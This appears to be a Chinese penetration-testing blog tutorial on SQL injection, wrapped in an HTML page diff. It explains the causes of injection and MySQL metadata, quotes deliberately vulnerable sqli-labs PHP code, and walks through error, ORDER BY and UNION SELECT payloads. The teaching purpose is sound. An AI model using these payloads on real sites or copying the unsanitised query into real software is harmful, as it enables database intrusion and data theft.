@@ -1,0 +1,821 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入精讲 | Hungs-生活在左上角</title><meta name="author" content="hungs"><meta name="copyright" content="hungs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="渗透测试SQL精讲">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入精讲">
+<meta property="og:url" content="https://hungslab.github.io/posts/bd44.html">
+<meta property="og:site_name" content="Hungs-生活在左上角">
+<meta property="og:description" content="渗透测试SQL精讲">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2023/10/21/MIrJAoiUqnx6zpw.jpg">
+<meta property="article:published_time" content="2023-10-10T15:15:00.000Z">
+<meta property="article:modified_time" content="2023-10-20T16:06:50.517Z">
+<meta property="article:author" content="hungs">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/10/21/MIrJAoiUqnx6zpw.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hungslab.github.io/posts/bd44.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8-R8ai-C9Vq5keW_bcZ4dzYeQUPjrY1-3L2eE-ihohY"/><meta name="baidu-site-verification" content="code-3VKfAyLlIC"/><meta name="msvalidate.01" content="6B61F2B4D54E644405AE2167A82F77FC"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: hungs","link":"Link: ","source":"Source: Hungs-生活在左上角","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入精讲',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-21 00:06:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/js/runtime/runtime.js"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://www.fomal.cc/static/css/runtime.min.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/26/EJys7PtcMRQ4gT1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/10/21/MIrJAoiUqnx6zpw.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Hungs-生活在左上角"><span class="site-name">Hungs-生活在左上角</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入精讲</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-10T15:15:00.000Z" title="Created 2023-10-10 23:15:00">2023-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-20T16:06:50.517Z" title="Updated 2023-10-21 00:06:50">2023-10-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">12.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>48min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入精讲"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><h4 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h4><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。</p>
+<p>由于SQL语句本身的多样性，以及可用于构造SQL语句的方法很多，因此凡是构造SQL语句的步骤均存在被攻击的潜在风险。</p>
+<p>SQL注入的方式主要是直接将代码插入参数中，这些参数会被置入SQL命令中加以执行。</p>
+<p>间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。</p>
+<p>当将存储的字符串置入动态SQL命令中时，恶意代码就将被执行。</p>
+<p>如果web应用未对动态构造的SQL语句使用的参数进行正确性审查（即便使用了参数化技术）</p>
+<p>攻击者就很可能会修改后台SQL语句的构造</p>
+<p>如果攻击者能够修改SQL语句，那么该语句将与应用的用户具有相同的权限。</p>
+<p>当使用SQL服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。</p>
+<p>如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p>
+<h4 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.产生过程</span><br><span class="line">	大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</span><br><span class="line">2.常见的sql注入产生原因</span><br><span class="line">	基于此，SQL注入的产生原因通常表现在以下几方面：</span><br><span class="line">	1. 转义字符处理不合适；</span><br><span class="line">	2. 不安全的数据库配置；</span><br><span class="line">	3. 不合理的查询集处理；</span><br><span class="line">	4. 不当的错误处理；</span><br><span class="line">	5. 多个提交处理不当。 </span><br><span class="line">3.不当的处理类型</span><br><span class="line">    Sql数据库将单引号字符（’）解析成代码与数据间的分界线：</span><br><span class="line">    单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。</span><br><span class="line">    因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </span><br><span class="line">4.不安全的数据库配置</span><br><span class="line">   数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</span><br><span class="line">   这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</span><br><span class="line">5.不合理的查询集处理</span><br><span class="line">    有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</span><br><span class="line">6.不当的错误处理</span><br><span class="line">    错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </span><br><span class="line">7.多个提交处理不当</span><br><span class="line">	大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</span><br><span class="line">    应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</span><br><span class="line">    例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </span><br></pre></td></tr></table></figure>
+<h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>数据在数据库中是按照表单的方式存储的</p>
+<p>在phpstudy里面</p>
+<p>可以很方便的打开mysql终端</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461842773-c072384e-87c2-4b75-bfc6-8247ac3ea217.png" alt="img"></p>
+<p>使用 <code>show databases;</code> 命令可以查看所有的数据库名</p>
+<p>我的存在数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">challenges</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line">security</span><br><span class="line">test</span><br><span class="line">yichen</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461099740-907a0ae6-9bb7-4a99-9973-2fb0937a448e.png" alt="img"></p>
+<p>其中：<strong>information_schema</strong> 数据库是 MySQL 自带的</p>
+<p>在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库</p>
+<p>其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息</p>
+<p>如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
+<p>数据库里面几张重要的表的状态我放在这，如果后面涉及这几张表不太明白可以回来看一下</p>
+<p>使用<code>use yichen;</code> 用来选择想要使用的数据库</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461487799-565a79c5-5278-4aee-8057-dca7d3b59a95.png" alt="img"></p>
+<p>使用 <code>show tables;</code> 来显示数据库中的所有数据表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461593350-90cbee18-612b-4b6f-ac1a-e065bae4e209.png" alt="img"></p>
+<p>使用 <code>select * from yichen;</code> 来查看数据表”yichen”中所有的数据信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461958036-f609eaaa-922f-4eb2-a954-48f7d4eefe39.png" alt="img"></p>
+<p>数据表：yichen中一共有三列数据，列名分别是：id，name，age</p>
+<p>如果想查看yichen表中writeup的年龄应该怎样那？</p>
+<p>有两种简单的方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> yichen <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;writeup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> yichen <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是name字段属于字符串，所以需要用单引号引起来</p>
+<p>那其实当我们访问一个网页上的时候比如sqli-labs的第一关：</p>
+<p>?id=1实际上就是去数据库里面查询id=1的时候的 name 和 password列的值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573462434520-3b672c43-8219-48a4-bef9-095410f4a486.png" alt="img"></p>
+<p>补充一些关于information_schema数据库的数据表的信息：</p>
+<p><strong>SCHEMATA 表：</strong></p>
+<p>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474150129-3f2bd79e-a202-4e8e-b856-0aafde35fa82.png" alt="img"></p>
+<p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472943149-8b1d46ce-6403-48f5-8ac8-f213e5ffc4b5.png" alt="img"></p>
+<p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474346090-85d104c4-c093-464b-8af4-5ef3b1c300c3.png" alt="img"></p>
+<p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474209881-b5b2a5cf-5a19-420b-ad6f-fbb690f1ff67.png" alt="img"></p>
+<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>前面提到访问?id=1的时候就是去数据库里查询id=1的字段的值，</p>
+<p>那么</p>
+<p>当我不去正常访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br></pre></td></tr></table></figure>
+<p>而是访问一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p>会发生什么？报错了！</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463020241-ea253b3e-aecf-4e98-b0b8-0be5199c9291.png" alt="img"></p>
+<p>看报错的回显发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">您的SQL语法有误； </span><br><span class="line">检查与您的MySQL服务器版本相对应的手册以获取正确的语法</span><br><span class="line">以在第1行的&#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27;附近使用</span><br></pre></td></tr></table></figure>
+<p>仔细看一下，’’1’’ LIMIT 0,1’，会发现单引号是这么配对的<img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463731758-49360687-a0f8-4af2-97c5-12069ba95d80.png" alt="img"></p>
+<p>也就是说我们输入的 1’ 去查询的时候出问题了，我们可以查看一下less-1的源代码，找到查询语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))<span class="comment">//使用get方式接受一个参数id</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];<span class="comment">//把get得到的id的值赋给变量id</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">//使用这条语句去查询</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);<span class="comment">//把查询的结果给result这个变量</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);<span class="comment">//把结果变成了数组的形式</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)<span class="comment">//如果得到结果就把他展示出来↓</span></span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="comment">//没有得到结果就展示mysql操作产生的文本错误信息</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们只要关心这一句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>把之前传入的 <code>1&#39;</code> 带入 <code>$id</code> 看看结果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>会发现传入的单引号把原本已经存在的那一个左单引号闭合掉了</p>
+<p>那多出来的那一个右单引号就出了问题了</p>
+<p>导致后面的语句被识别为要运行的代码</p>
+<p>使用 and 1=1—+</p>
+<p>mysql中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/xiayun1995/article/details/86500605">sql注入中的注释符的解释</a></p>
+<p><code>&#39;order by 4--+</code> 猜列数</p>
+<p>order by 是用来排序的，后面可以跟着列数，比如 order by 1 是按照第一列来排序，当使用大于数据表有的列数的时候就肯定会报错了，这样就可以用来判断有几列</p>
+<p><code>-1&#39;union select 1,2,3--+</code> 联合查询，一般用来检查什么地方可以回显</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472008439-91aa61d7-2a5e-4929-afb0-64fe8df559bd.png" alt="img"></p>
+<p>显示出 2,3，说明这里 2 与 3 的位置会被打印出来</p>
+<p>我们就可以把想要查询的放在这里两个位置让他显示给我们</p>
+<h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><p>SQL 注入分类：</p>
+<p>按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>
+<ul>
+<li>[ ] UNION query SQL injection               （可联合查询注入）</li>
+<li>[ ] Stacked queries SQL injection           （可多语句查询注入）堆叠查询</li>
+<li>[ ] Boolean-based blind SQL injection       （布尔型注入）</li>
+<li>[ ] Error-based SQL injection               （报错型注入）</li>
+<li>[ ] Time-based blind SQL injection          （基于时间延迟注入）</li>
+</ul>
+<p>接受请求类型区：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.GET 注入</span><br><span class="line">GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</span><br><span class="line">2.POST注入</span><br><span class="line">POST 请求参数是放在请求 body 里的，长度没有限制</span><br><span class="line">3.COOKIE注入</span><br><span class="line">cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</span><br></pre></td></tr></table></figure>
+<p>注入数据类型的区分：</p>
